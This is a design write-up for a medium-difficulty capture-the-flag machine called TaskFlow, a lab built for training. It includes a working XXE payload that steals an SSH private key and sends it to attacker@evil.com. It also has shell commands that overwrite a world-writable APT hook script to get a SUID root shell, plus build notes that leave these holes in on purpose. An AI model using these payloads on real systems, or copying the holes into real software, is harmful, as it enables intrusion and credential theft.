# CTF Machine: TaskFlow

## Overview

**Name:** TaskFlow
**Difficulty:** Medium
**OS:** Ubuntu 24.04 LTS
**Domain:** `taskflow.ms`
**Theme:** Polished task management startup with unsafe XML parsing and sloppy sysadmin habits

**Story:** TaskFlow is a sleek task management SaaS built by a small dev team obsessed with clean UI but careless with backend security. The lead developer chose XML for client-server communication because "it's more structured than JSON" — but never disabled external entity processing. Meanwhile, the sysadmin wrote a health-check script to auto-restart the service after system updates, fat-fingered `chmod 757` instead of `755`, and never looked back. The landing page screams enterprise-grade security. The code tells a different story.

---

## Architecture

| Component | Detail |
|-----------|--------|
| Web | Nginx (HTTPS 443) → Python/Flask API (port 5000) |
| Database | PostgreSQL (localhost, password auth) |
| Task Runner | Cron (`apt-get update` every minute as root) |
| APT Hook | `/etc/apt/apt.conf.d/80-taskflow` → `/usr/local/bin/taskflow-health-check` |
| Open Ports | 22 (SSH), 443 (HTTPS) |
| App runs as | `root` (Flask app) |

---

## Attack Chain

### 1 → XML External Entity Injection (CWE-611) — Anonymous → SSH Key Exfiltration

The solver registers an account on `taskflow.ms` and observes via browser DevTools or Burp that the registration form sends data as `Content-Type: application/xml`. This is an immediate signal to test for XXE.

The solver crafts a `DOCTYPE` with a `SYSTEM` entity pointing to `file:///home/john/.ssh/id_rsa` and places their own email in the `<name>` field. The application resolves the entity, reads the private key, and includes it in the verification email sent to the attacker's address under the "Registered email" section. The app runs as `root`, so it can read any file on disk.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///home/john/.ssh/id_rsa">
]>
<registration>
  <name>&xxe;</name>
  <email>attacker@evil.com</email>
  <password>anything</password>
</registration>
```

**Why it works:** The lead developer chose XML for "structure" and used Python's `lxml` with default settings, which resolves external entities. The app runs as root because the developer followed a quick-start guide that used `sudo python3 app.py`. The verification email includes the user's name, which now contains the SSH key.

### 2 → SSH Access — Key Exfiltration → john

The solver saves the exfiltrated RSA private key, sets `chmod 600`, and connects via SSH:

```bash
chmod 600 id_rsa
ssh -i id_rsa john@taskflow.ms
```

User flag is in `/home/john/user.txt`.

### 3 → Writable APT Hook Script (CWE-732) — john → root

Standard privesc enumeration reveals a cron job running `apt-get update` as root every minute (`/etc/cron.d/apt-auto-update`). Checking APT hooks in `/etc/apt/apt.conf.d/80-taskflow` shows a `Post-Invoke-Success` hook calling `/usr/local/bin/taskflow-health-check`.

File permissions on that script are `757` — world-writable. The solver overwrites the script with a payload:

```bash
# Check the cron job
cat /etc/cron.d/apt-auto-update

# Check the APT hook
cat /etc/apt/apt.conf.d/80-taskflow

# Check permissions on the health-check script
ls -la /usr/local/bin/taskflow-health-check

# Overwrite with payload
echo -e '#!/bin/bash\ncp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' > /usr/local/bin/taskflow-health-check

# Wait for cron cycle (~1 minute)
# Then:
/tmp/rootbash -p
```

**Why it works:** The sysadmin wrote the health-check script to auto-restart the Flask app after system updates. When setting permissions, he typed `chmod 757` instead of `755` — a one-digit typo that made the script world-writable. Combined with a root cron running `apt-get update` every minute (to keep the server patched), any user can inject commands that execute as root.

---

## Rabbit Holes

### Rabbit Hole 1: XXE on /api/login

The solver might try XXE on the `/api/login` endpoint — it also accepts XML and looks identical to `/api/register`. However, the login endpoint uses a different parser configuration with `resolve_entities=False` and `load_dtd=False`, so XXE is dead there. The real path is exclusively through `/api/register`.

**What it teaches:** Not all endpoints using the same data format share the same parser configuration. Always test each endpoint individually.

### Rabbit Hole 2: Standard Privesc Enumeration Dead Ends

`sudo -l` returns nothing for `john`. SUID binaries are all stock Ubuntu defaults. No Docker group, no interesting crontabs in `john`'s crontab. The solver must look beyond the usual suspects and check system-wide cron jobs and APT hooks — a less commonly enumerated privesc vector.

**What it teaches:** Standard privesc checklists miss APT hooks. Real-world privilege escalation often lives in less obvious system automation.

---

## Flags

| Flag | Location | Access |
|------|----------|--------|
| user.txt | /home/john/ | john |
| root.txt | /root/ | root |

---

## Full Chain Diagram

```
Anonymous
    │  nmap → Burp → observe XML registration
    │  XXE on /api/register → exfiltrate SSH key
    ▼
john  →  user.txt
    │  cron enumeration → apt-get update as root
    │  APT hook → writable health-check script (757)
    │  Overwrite script → wait for cron → rootbash
    ▼
root  →  root.txt
```

---

## Implementation Notes

### Packages to Install
- nginx, python3, python3-pip, python3-lxml, postgresql, openssh-server

### Configuration Changes
- Nginx reverse proxy 443 → localhost:5000 with self-signed SSL
- Flask app using lxml with default entity resolution on `/api/register`
- Flask app using lxml with `resolve_entities=False` on `/api/login`
- Flask app runs as root via systemd
- Cron job in `/etc/cron.d/apt-auto-update`: `* * * * * root apt-get update`
- APT hook in `/etc/apt/apt.conf.d/80-taskflow` calling health-check script
- Health-check script at `/usr/local/bin/taskflow-health-check` with permissions `757`

### Files to Create
- Flask application with registration, login, task management
- Email verification system (can use local mail or log to file)
- Health-check script that restarts the Flask service
- APT hook configuration

### Services to Enable
- nginx, postgresql, taskflow (systemd), cron

### User Accounts
| Username | Password | Shell | Groups | Purpose |
|----------|----------|-------|--------|---------|
| john | [random] | /bin/bash | john | Developer with SSH key |

### Verification Checklist
- [ ] `nmap -sV` shows only ports 22 and 443
- [ ] Registration sends XML and is vulnerable to XXE
- [ ] Login sends XML but is NOT vulnerable to XXE
- [ ] XXE can read `/home/john/.ssh/id_rsa`
- [ ] SSH key works for `john` user
- [ ] `sudo -l` returns nothing for `john`
- [ ] SUID binaries are stock Ubuntu only
- [ ] Cron job runs `apt-get update` as root every minute
- [ ] Health-check script has `757` permissions
- [ ] Overwriting health-check script achieves root
- [ ] user.txt readable by john, root.txt readable by root only
